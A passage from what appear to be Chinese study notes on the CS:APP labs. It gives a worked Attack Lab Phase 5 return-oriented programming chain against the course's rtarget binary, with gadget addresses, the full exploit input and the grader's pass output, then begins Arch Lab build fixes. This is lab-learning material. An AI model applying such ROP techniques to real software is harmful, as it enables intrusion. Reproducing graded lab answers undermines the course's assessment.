class=w> </span><span class=m>59</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>C5<span class=w> </span><span class=m>19</span><span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>EC<span class=w> </span><span class=m>17</span><span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=phase-5_1>Phase 5<a class=headerlink href=#phase-5_1 title="Permanent link">¶</a></h3> <p>本题的任务与Phase 3相同，都是要求返回到<code>touch3</code>函数。Phase 3中用到的注入代码为：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-70-1>1</a></span>
<span class=normal><a href=#__codelineno-70-2>2</a></span>
<span class=normal><a href=#__codelineno-70-3>3</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-70-1><a id=__codelineno-70-1 name=__codelineno-70-1></a><span class=nf>movq</span><span class=w>    </span><span class=no>$0x59b997fa</span><span class=p>,</span><span class=w> </span><span class=nv>%rdi</span>
</span><span id=__span-70-2><a id=__codelineno-70-2 name=__codelineno-70-2></a><span class=nf>pushq</span><span class=w>   </span><span class=no>$0x4017ec</span>
</span><span id=__span-70-3><a id=__codelineno-70-3 name=__codelineno-70-3></a><span class=nf>ret</span>
</span></code></pre></div></td></tr></table></div> <p>其中<code>0x5561dca8</code>是栈中cookie存放的地址，而在本题中，栈的位置是随机的，把cookie存放在栈中似乎不太现实，但是我们又不得不这样做，那么有什么办法呢？只能在代码中获取<code>%rsp</code>的地址，然后根据偏移量来确定cookie的地址。</p> <p>查表，<code>movq %rsp, xxx</code>表示为<code>48 89 xx</code>，查找一下有没有可用的gadget，找到了：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-71-1>1</a></span>
<span class=normal><a href=#__codelineno-71-2>2</a></span>
<span class=normal><a href=#__codelineno-71-3>3</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-71-1><a id=__codelineno-71-1 name=__codelineno-71-1></a><span class=err>0000000000401</span><span class=nf>aab</span><span class=w> </span><span class=err>&lt;</span><span class=no>setval_350</span><span class=err>&gt;</span><span class=p>:</span>
</span><span id=__span-71-2><a id=__codelineno-71-2 name=__codelineno-71-2></a><span class=err>401</span><span class=nl>aab:</span><span class=w>       </span><span class=nf>c7</span><span class=w> </span><span class=mi>07</span><span class=w> </span><span class=mi>48</span><span class=w> </span><span class=mi>89</span><span class=w> </span><span class=no>e0</span><span class=w> </span><span class=mi>90</span><span class=w>       </span><span class=no>movl</span><span class=w>   </span><span class=no>$0x90e08948</span><span class=p>,(</span><span class=nv>%rdi</span><span class=p>)</span>
</span><span id=__span-71-3><a id=__codelineno-71-3 name=__codelineno-71-3></a><span class=err>401</span><span class=nl>ab1:</span><span class=w>       </span><span class=nf>c3</span><span class=w>                      </span><span class=no>retq</span>
</span></code></pre></div></td></tr></table></div> <p>因此，地址0x401aad处的<code>48 89 e0</code>就是我们需要的指令：<code>movq %rsp, %rax</code>。通过合适的赋值，这段代码就能实现<code>%rsp</code>加上段内偏移地址来确定cookie的位置。剩下部分流程与Phase 3一致，大体思路如下：</p> <ul> <li>先取得栈顶指针的位置，赋给 <code>%rdi</code></li> <li>取出存在栈中的偏移量的值，赋给 <code>%rsi</code></li> <li>通过<code>lea (%rdi,%rsi,1),%rax</code>得到 cookie 的地址, 即<code>%rax = %rdi + (%rsi × 1)</code></li> <li>将 cookie 的地址通过<code>%rax</code>传给<code>%rdi</code></li> <li>调用<code>touch 3</code></li> </ul> <p>找到的gadget代码如下：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-72-1> 1</a></span>
<span class=normal><a href=#__codelineno-72-2> 2</a></span>
<span class=normal><a href=#__codelineno-72-3> 3</a></span>
<span class=normal><a href=#__codelineno-72-4> 4</a></span>
<span class=normal><a href=#__codelineno-72-5> 5</a></span>
<span class=normal><a href=#__codelineno-72-6> 6</a></span>
<span class=normal><a href=#__codelineno-72-7> 7</a></span>
<span class=normal><a href=#__codelineno-72-8> 8</a></span>
<span class=normal><a href=#__codelineno-72-9> 9</a></span>
<span class=normal><a href=#__codelineno-72-10>10</a></span>
<span class=normal><a href=#__codelineno-72-11>11</a></span>
<span class=normal><a href=#__codelineno-72-12>12</a></span>
<span class=normal><a href=#__codelineno-72-13>13</a></span>
<span class=normal><a href=#__codelineno-72-14>14</a></span>
<span class=normal><a href=#__codelineno-72-15>15</a></span>
<span class=normal><a href=#__codelineno-72-16>16</a></span>
<span class=normal><a href=#__codelineno-72-17>17</a></span>
<span class=normal><a href=#__codelineno-72-18>18</a></span>
<span class=normal><a href=#__codelineno-72-19>19</a></span>
<span class=normal><a href=#__codelineno-72-20>20</a></span>
<span class=normal><a href=#__codelineno-72-21>21</a></span>
<span class=normal><a href=#__codelineno-72-22>22</a></span>
<span class=normal><a href=#__codelineno-72-23>23</a></span>
<span class=normal><a href=#__codelineno-72-24>24</a></span>
<span class=normal><a href=#__codelineno-72-25>25</a></span>
<span class=normal><a href=#__codelineno-72-26>26</a></span>
<span class=normal><a href=#__codelineno-72-27>27</a></span>
<span class=normal><a href=#__codelineno-72-28>28</a></span>
<span class=normal><a href=#__codelineno-72-29>29</a></span>
<span class=normal><a href=#__codelineno-72-30>30</a></span>
<span class=normal><a href=#__codelineno-72-31>31</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-72-1><a id=__codelineno-72-1 name=__codelineno-72-1></a><span class=c1>#地址：0x401aad</span>
</span><span id=__span-72-2><a id=__codelineno-72-2 name=__codelineno-72-2></a><span class=nf>movq</span><span class=w> </span><span class=nv>%rsp</span><span class=p>,</span><span class=w> </span><span class=nv>%rax</span>
</span><span id=__span-72-3><a id=__codelineno-72-3 name=__codelineno-72-3></a><span class=nf>ret</span>
</span><span id=__span-72-4><a id=__codelineno-72-4 name=__codelineno-72-4></a>
</span><span id=__span-72-5><a id=__codelineno-72-5 name=__codelineno-72-5></a><span class=c1>#地址：0x4019a2</span>
</span><span id=__span-72-6><a id=__codelineno-72-6 name=__codelineno-72-6></a><span class=nf>movq</span><span class=w> </span><span class=nv>%rax</span><span class=p>,</span><span class=w> </span><span class=nv>%rdi</span>
</span><span id=__span-72-7><a id=__codelineno-72-7 name=__codelineno-72-7></a><span class=nf>ret</span>
</span><span id=__span-72-8><a id=__codelineno-72-8 name=__codelineno-72-8></a>
</span><span id=__span-72-9><a id=__codelineno-72-9 name=__codelineno-72-9></a><span class=c1>#地址：0x4019cc</span>
</span><span id=__span-72-10><a id=__codelineno-72-10 name=__codelineno-72-10></a><span class=nf>popq</span><span class=w> </span><span class=nv>%rax</span>
</span><span id=__span-72-11><a id=__codelineno-72-11 name=__codelineno-72-11></a><span class=nf>ret</span>
</span><span id=__span-72-12><a id=__codelineno-72-12 name=__codelineno-72-12></a>
</span><span id=__span-72-13><a id=__codelineno-72-13 name=__codelineno-72-13></a><span class=c1>#地址：0x4019dd</span>
</span><span id=__span-72-14><a id=__codelineno-72-14 name=__codelineno-72-14></a><span class=nf>movl</span><span class=w> </span><span class=nv>%eax</span><span class=p>,</span><span class=w> </span><span class=nv>%edx</span>
</span><span id=__span-72-15><a id=__codelineno-72-15 name=__codelineno-72-15></a><span class=nf>ret</span>
</span><span id=__span-72-16><a id=__codelineno-72-16 name=__codelineno-72-16></a>
</span><span id=__span-72-17><a id=__codelineno-72-17 name=__codelineno-72-17></a><span class=c1>#地址：0x401a70</span>
</span><span id=__span-72-18><a id=__codelineno-72-18 name=__codelineno-72-18></a><span class=nf>movl</span><span class=w> </span><span class=nv>%edx</span><span class=p>,</span><span class=w> </span><span class=nv>%ecx</span>
</span><span id=__span-72-19><a id=__codelineno-72-19 name=__codelineno-72-19></a><span class=nf>ret</span>
</span><span id=__span-72-20><a id=__codelineno-72-20 name=__codelineno-72-20></a>
</span><span id=__span-72-21><a id=__codelineno-72-21 name=__codelineno-72-21></a><span class=c1>#地址：0x401a13</span>
</span><span id=__span-72-22><a id=__codelineno-72-22 name=__codelineno-72-22></a><span class=nf>movl</span><span class=w> </span><span class=nv>%ecx</span><span class=p>,</span><span class=w> </span><span class=nv>%esi</span>
</span><span id=__span-72-23><a id=__codelineno-72-23 name=__codelineno-72-23></a><span class=nf>ret</span>
</span><span id=__span-72-24><a id=__codelineno-72-24 name=__codelineno-72-24></a>
</span><span id=__span-72-25><a id=__codelineno-72-25 name=__codelineno-72-25></a><span class=c1>#地址：0x4019d6</span>
</span><span id=__span-72-26><a id=__codelineno-72-26 name=__codelineno-72-26></a><span class=nf>lea</span><span class=w>    </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>,</span><span class=nv>%rsi</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=nv>%rax</span>
</span><span id=__span-72-27><a id=__codelineno-72-27 name=__codelineno-72-27></a><span class=nf>ret</span>
</span><span id=__span-72-28><a id=__codelineno-72-28 name=__codelineno-72-28></a>
</span><span id=__span-72-29><a id=__codelineno-72-29 name=__codelineno-72-29></a><span class=c1>#地址：0x4019a2</span>
</span><span id=__span-72-30><a id=__codelineno-72-30 name=__codelineno-72-30></a><span class=nf>movq</span><span class=w> </span><span class=nv>%rax</span><span class=p>,</span><span class=w> </span><span class=nv>%rdi</span>
</span><span id=__span-72-31><a id=__codelineno-72-31 name=__codelineno-72-31></a><span class=nf>ret</span>
</span></code></pre></div></td></tr></table></div> <p>栈帧如下，为节省空间，每一行代码都省略了后面的<code>ret</code>:</p> <p><img alt="alt text" src=../../img/image-95.png></p> <p>要注意，<code>getbuf</code>执行<code>ret</code>后相当于进行了一次<code>pop</code>操作，<code>test</code>的栈顶指针<code>%rsp=%rsp+0x8</code>，所以cookie相对于此时栈顶指针的偏移量是<code>0x48</code>，而不是<code>0x50</code>。（新<code>%rsp</code>往上数9格，也就是8 * 9 = 72 = 0x48）</p> <p>根据上图的栈帧，就能写出输入序列：</p> <div class="language-text highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-73-1> 1</a></span>
<span class=normal><a href=#__codelineno-73-2> 2</a></span>
<span class=normal><a href=#__codelineno-73-3> 3</a></span>
<span class=normal><a href=#__codelineno-73-4> 4</a></span>
<span class=normal><a href=#__codelineno-73-5> 5</a></span>
<span class=normal><a href=#__codelineno-73-6> 6</a></span>
<span class=normal><a href=#__codelineno-73-7> 7</a></span>
<span class=normal><a href=#__codelineno-73-8> 8</a></span>
<span class=normal><a href=#__codelineno-73-9> 9</a></span>
<span class=normal><a href=#__codelineno-73-10>10</a></span>
<span class=normal><a href=#__codelineno-73-11>11</a></span>
<span class=normal><a href=#__codelineno-73-12>12</a></span>
<span class=normal><a href=#__codelineno-73-13>13</a></span>
<span class=normal><a href=#__codelineno-73-14>14</a></span>
<span class=normal><a href=#__codelineno-73-15>15</a></span>
<span class=normal><a href=#__codelineno-73-16>16</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-73-1><a id=__codelineno-73-1 name=__codelineno-73-1></a>00 00 00 00 00 00 00 00 
</span><span id=__span-73-2><a id=__codelineno-73-2 name=__codelineno-73-2></a>00 00 00 00 00 00 00 00
</span><span id=__span-73-3><a id=__codelineno-73-3 name=__codelineno-73-3></a>00 00 00 00 00 00 00 00 
</span><span id=__span-73-4><a id=__codelineno-73-4 name=__codelineno-73-4></a>00 00 00 00 00 00 00 00
</span><span id=__span-73-5><a id=__codelineno-73-5 name=__codelineno-73-5></a>00 00 00 00 00 00 00 00 
</span><span id=__span-73-6><a id=__codelineno-73-6 name=__codelineno-73-6></a>ad 1a 40 00 00 00 00 00 
</span><span id=__span-73-7><a id=__codelineno-73-7 name=__codelineno-73-7></a>a2 19 40 00 00 00 00 00 
</span><span id=__span-73-8><a id=__codelineno-73-8 name=__codelineno-73-8></a>cc 19 40 00 00 00 00 00 
</span><span id=__span-73-9><a id=__codelineno-73-9 name=__codelineno-73-9></a>48 00 00 00 00 00 00 00 
</span><span id=__span-73-10><a id=__codelineno-73-10 name=__codelineno-73-10></a>dd 19 40 00 00 00 00 00 
</span><span id=__span-73-11><a id=__codelineno-73-11 name=__codelineno-73-11></a>70 1a 40 00 00 00 00 00 
</span><span id=__span-73-12><a id=__codelineno-73-12 name=__codelineno-73-12></a>13 1a 40 00 00 00 00 00 
</span><span id=__span-73-13><a id=__codelineno-73-13 name=__codelineno-73-13></a>d6 19 40 00 00 00 00 00 
</span><span id=__span-73-14><a id=__codelineno-73-14 name=__codelineno-73-14></a>a2 19 40 00 00 00 00 00 
</span><span id=__span-73-15><a id=__codelineno-73-15 name=__codelineno-73-15></a>fa 18 40 00 00 00 00 00 
</span><span id=__span-73-16><a id=__codelineno-73-16 name=__codelineno-73-16></a>35 39 62 39 39 37 66 61
</span></code></pre></div></td></tr></table></div> <p>结果：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-74-1>1</a></span>
<span class=normal><a href=#__codelineno-74-2>2</a></span>
<span class=normal><a href=#__codelineno-74-3>3</a></span>
<span class=normal><a href=#__codelineno-74-4>4</a></span>
<span class=normal><a href=#__codelineno-74-5>5</a></span>
<span class=normal><a href=#__codelineno-74-6>6</a></span>
<span class=normal><a href=#__codelineno-74-7>7</a></span>
<span class=normal><a href=#__codelineno-74-8>8</a></span>
<span class=normal><a href=#__codelineno-74-9>9</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-74-1><a id=__codelineno-74-1 name=__codelineno-74-1></a>Linux$<span class=w> </span>./hex2raw<span class=w> </span>&lt;<span class=w> </span>p5.txt<span class=w> </span><span class=p>|</span><span class=w> </span>./rtarget<span class=w> </span>-q
</span><span id=__span-74-2><a id=__codelineno-74-2 name=__codelineno-74-2></a>Cookie:<span class=w> </span>0x59b997fa
</span><span id=__span-74-3><a id=__codelineno-74-3 name=__codelineno-74-3></a>Type<span class=w> </span>string:Touch3!:<span class=w> </span>You<span class=w> </span>called<span class=w> </span>touch3<span class=o>(</span><span class=s2>"59b997fa"</span><span class=o>)</span>
</span><span id=__span-74-4><a id=__codelineno-74-4 name=__codelineno-74-4></a>Valid<span class=w> </span>solution<span class=w> </span><span class=k>for</span><span class=w> </span>level<span class=w> </span><span class=m>3</span><span class=w> </span>with<span class=w> </span>target<span class=w> </span>rtarget
</span><span id=__span-74-5><a id=__codelineno-74-5 name=__codelineno-74-5></a>PASS:<span class=w> </span>Would<span class=w> </span>have<span class=w> </span>posted<span class=w> </span>the<span class=w> </span>following:
</span><span id=__span-74-6><a id=__codelineno-74-6 name=__codelineno-74-6></a><span class=w>        </span>user<span class=w> </span>id<span class=w> </span>bovik
</span><span id=__span-74-7><a id=__codelineno-74-7 name=__codelineno-74-7></a><span class=w>        </span>course<span class=w>  </span><span class=m>15213</span>-f15
</span><span id=__span-74-8><a id=__codelineno-74-8 name=__codelineno-74-8></a><span class=w>        </span>lab<span class=w>     </span>attacklab
</span><span id=__span-74-9><a id=__codelineno-74-9 name=__codelineno-74-9></a><span class=w>        </span>result<span class=w>  </span><span class=m>1</span>:PASS:0xffffffff:rtarget:3:00<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>AD<span class=w> </span>1A<span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>A2<span class=w> </span><span class=m>19</span><span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>CC<span class=w> </span><span class=m>19</span><span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>48</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>DD<span class=w> </span><span class=m>19</span><span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>70</span><span class=w> </span>1A<span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>13</span><span class=w> </span>1A<span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>D6<span class=w> </span><span class=m>19</span><span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>A2<span class=w> </span><span class=m>19</span><span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>FA<span class=w> </span><span class=m>18</span><span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>35</span><span class=w> </span><span class=m>39</span><span class=w> </span><span class=m>62</span><span class=w> </span><span class=m>39</span><span class=w> </span><span class=m>39</span><span class=w> </span><span class=m>37</span><span class=w> </span><span class=m>66</span><span class=w> </span><span class=m>61</span>
</span></code></pre></div></td></tr></table></div> </li> </ol> <h2 id=arch-lab>Arch Lab<a class=headerlink href=#arch-lab title="Permanent link">¶</a></h2> <ol> <li> <p>Arch Lab 分为三部分:</p> <ul> <li>Part A: 需要我们写一些简单的Y86-64程序，从而熟悉Y86-64工具的使用。</li> <li>Part B: 我们要用一个新的指令(<code>iaddq</code>: 将立即数与寄存器相加) 来扩展SEQ仿真器。</li> <li>Part C: 本实验的核心，我们要通过理解流水线的过程以及利用新的指令来优化Y86-64基准程序和处理器设计。</li> </ul> <p>后续的所有工作都是在sim文件夹中进行操作的，然后执行：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-75-1>1</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-75-1><a id=__codelineno-75-1 name=__codelineno-75-1></a>sim$<span class=w> </span>make<span class=w> </span>clean<span class=p>;</span><span class=w> </span>make
</span></code></pre></div></td></tr></table></div> <p>报错：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-76-1>1</a></span>
<span class=normal><a href=#__codelineno-76-2>2</a></span>
<span class=normal><a href=#__codelineno-76-3>3</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-76-1><a id=__codelineno-76-1 name=__codelineno-76-1></a>/usr/bin/ld:<span class=w> </span>yas.o:/home/CSAPP-Lab/04-Arch-Lab/sim/misc/yas.h:13:<span class=w> </span>multiple<span class=w> </span>definition<span class=w> </span>of<span class=w> </span><span class=sb>`</span>lineno<span class=err>'</span><span class=p>;</span><span class=w> </span>yas-grammar.o:<span class=o>(</span>.bss+0x0<span class=o>)</span>:<span class=w> </span>first<span class=w> </span>defined<span class=w> </span>here
</span><span id=__span-76-2><a id=__codelineno-76-2 name=__codelineno-76-2></a>collect2:<span class=w> </span>error:<span class=w> </span>ld<span class=w> </span>returned<span class=w> </span><span class=m>1</span><span class=w> </span><span class=nb>exit</span><span class=w> </span>status
</span><span id=__span-76-3><a id=__codelineno-76-3 name=__codelineno-76-3></a>make<span class=o>[</span><span class=m>1</span><span class=o>]</span>:<span class=w> </span>***<span class=w> </span><span class=o>[</span>Makefile:32:<span class=w> </span>yas<span class=o>]</span><span class=w> </span>Error<span class=w> </span><span class=m>1</span>
</span></code></pre></div></td></tr></table></div> <p>🛠️Fix: <code>-fcommon</code> 告诉 GCC 把未初始化的全局变量（tentative definitions，例如 <code>int x;</code>）放到 "COMMON" 段，允许多个翻译单元中出现同名的未初始化全局而在链接时合并；而 <code>-fno-common</code>（GCC 10 起的默认）将这样的符号视作真正的定义（放到 .bss/.data），若有重复定义会产生链接错误。使用 <code>-fcommon</code> 会掩盖一些重复定义的 bug；使用 <code>-fno-common</code> 更严格、更能早期发现问题。从 GCC 10 开始默认是 <code>-fno-common</code>，而显式加 <code>-fcommon</code> 是为了兼容旧代码，因此需要在<code>sim/misc/Makefile</code>中添加<code>-fcommon</code>标志:</p> <div class="language-Makefile highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-77-1>1</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-77-1><a id=__codelineno-77-1 name=__codelineno-77-1></a><span class=nv>LCFLAGS</span><span class=o>=</span>-O1<span class=w> </span>-fcommon<span class=w> </span><span class=c1># Add -fcommon</span>
</span></code></pre></div></td></tr></table></div> <p>继续报错：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-78-1>1</a></span>
<span class=normal><a href=#__codelineno-78-2>2</a></span>
<span class=normal><a href=#__codelineno-78-3>3</a></span>
<span class=normal><a href=#__codelineno-78-4>4</a></span>
<span class=normal><a href=#__codelineno-78-5>5</a></span>
<span class=normal><a href=#__codelineno-78-6>6</a></span>
<span class=normal><a href=#__codelineno-78-7>7</a></span>
<span class=normal><a href=#__codelineno-78-8>8</a></span>
<span class=normal><a href=#__codelineno-78-9>9</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-78-1><a id=__codelineno-78-1 name=__codelineno-78-1></a>/usr/bin/ld:<span class=w> </span>/tmp/ccp9m3Ha.o:<span class=o>(</span>.bss+0x0<span class=o>)</span>:<span class=w> </span>multiple<span class=w> </span>definition<span class=w> </span>of<span class=w> </span><span class=sb>`</span>mem_wb_state<span class=s1>'; /tmp/ccGHpqnC.o:(.bss+0x120): first defined here</span>
</span><span id=__span-78-2><a id=__codelineno-78-2 name=__codelineno-78-2></a><span class=s1>/usr/bin/ld: /tmp/ccp9m3Ha.o:(.bss+0x8): multiple definition of `ex_mem_state'</span><span class=p>;</span><span class=w> </span>/tmp/ccGHpqnC.o:<span class=o>(</span>.bss+0x128<span class=o>)</span>:<span class=w> </span>first<span class=w> </span>defined<span class=w> </span>here
</span><span id=__span-78-3><a id=__codelineno-78-3 name=__codelineno-78-3></a>/usr/bin/ld:<span class=w> </span>/tmp/ccp9m3Ha.o:<span class=o>(</span>.bss+0x10<span class=o>)</span>:<span class=w> </span>multiple<span class=w> </span>definition<span class=w> </span>of<span class=w> </span><span class=sb>`</span>id_ex_state<span class=s1>'; /tmp/ccGHpqnC.o:(.bss+0x130): first defined here</span>
</span><span id=__span-78-4><a id=__codelineno-78-4 name=__codelineno-78-4></a><span class=s1>/usr/bin/ld: /tmp/ccp9m3Ha.o:(.bss+0x18): multiple definition of `if_id_state'</span><span class=p>;</span><span class=w> </span>/tmp/ccGHpqnC.o:<span class=o>(</span>.bss+0x138<span class=o>)</span>:<span class=w> </span>first<span class=w> </span>defined<span class=w> </span>here
</span><span id=__span-78-5><a id=__codelineno-78-5 name=__codelineno-78-5></a>/usr/bin/ld:<span class=w> </span>/tmp/ccp9m3Ha.o:<span class=o>(</span>.bss+0x20<span class=o>)</span>:<span class=w> </span>multiple<span class=w> </span>definition<span class=w> </span>of<span class=w> </span><span class=sb>`</span>pc_state<span class=err>'</span><span class=p>;</span><span class=w> </span>/tmp/ccGHpqnC.o:<span class=o>(</span>.bss+0x140<span class=o>)</span>:<span class=w> </span>first<span class=w> </span>defined<span class=w> </span>here
</span><span id=__span-78-6><a id=__codelineno-78-6 name=__codelineno-78-6></a>/usr/bin/ld:<span class=w> </span>cannot<span class=w> </span>find<span class=w> </span>-ltk:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>file<span class=w> </span>or<span class=w> </span>directory
</span><span id=__span-78-7><a id=__codelineno-78-7 name=__codelineno-78-7></a>/usr/bin/ld:<span class=w> </span>cannot<span class=w> </span>find<span class=w> </span>-ltcl:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>file<span class=w> </span>or<span class=w> </span>directory
</span><span id=__span-78-8><a id=__codelineno-78-8 name=__codelineno-78-8></a>collect2:<span class=w> </span>error:<span class=w> </span>ld<span class=w> </span>returned<span class=w> </span><span class=m>1</span><span class=w> </span><span class=nb>exit</span><span class=w> </span>status
</span><span id=__span-78-9><a id=__codelineno-78-9 name=__codelineno-78-9></a>make<span class=o>[</span><span class=m>1</span><span class=o>]</span>:<span class=w> </span>***<span class=w> </span><span class=o>[</span>Makefile:44:<span class=w> </span>psim<span class=o>]</span><span class=w> </span>Error<span class=w> </span><span class=m>1</span>
</span></code></pre></div></td></tr></table></div> <p>🛠️Fix: 在<code>sim.h</code>如下代码处加上<code>extern</code>关键字:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-79-1>1</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-79-1><a id=__codelineno-79-1 name=__codelineno-79-1></a><span class=k>extern</span><span class=w> </span><span class=n>pipe_ptr</span><span class=w> </span><span class=n>pc_state</span><span class=p>,</span><span class=w> </span><span class=n>if_id_state</span><span class=p>,</span><span class=w> </span><span class=n>id_ex_state</span><span class=p>,</span><span class=w> </span><span class=n>ex_mem_state</span><span class=p>,</span><span class=w> </span><span class=n>mem_wb_state</span><span class=p>;</span><span class=w> </span><span class=c1>// Add extern</span>
</span></code></pre></div></td></tr></table></div> <p>继续报错：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-80-1>1</a></span>
<span class=normal><a href=#__codelineno-80-2>2</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-80-1><a id=__codelineno-80-1 name=__codelineno-80-1></a>/usr/bin/ld:<span class=w> </span>cannot<span class=w> </span>find<span class=w> </span>-ltk:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>file<span class=w> </span>or<span class=w> </span>directory
</span><span id=__span-80-2><a id=__codelineno-80-2 name=__codelineno-80-2></a>/usr/bin/ld:<span class=w> </span>cannot<span class=w> </span>find<span class=w> </span>-ltcl:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>file<span class=w> </span>or<span class=w> </span>directory
</span></code></pre></div></td></tr></table></div> <p>🛠️Fix: 安装缺少的库:</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-81-1>1</a></span>
<span class=normal><a href=#__codelineno-81-2>2</a></span>
<span class=normal><a href=#__codelineno-81-3>3</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-81-1><a id=__codelineno-81-1 name=__codelineno-81-1></a>sudo<span class=w> </span>apt<span class=w> </span>install<span class=w> </span>tcl<span class=w> </span>tcl-dev<span class=w> </span>tk<span class=w> </span>tk-dev
</span><span id=__span-81-2><a id=__codelineno-81-2 name=__codelineno-81-2></a>sudo<span class=w> </span>apt<span class=w> </span>install<span class=w> </span>flex
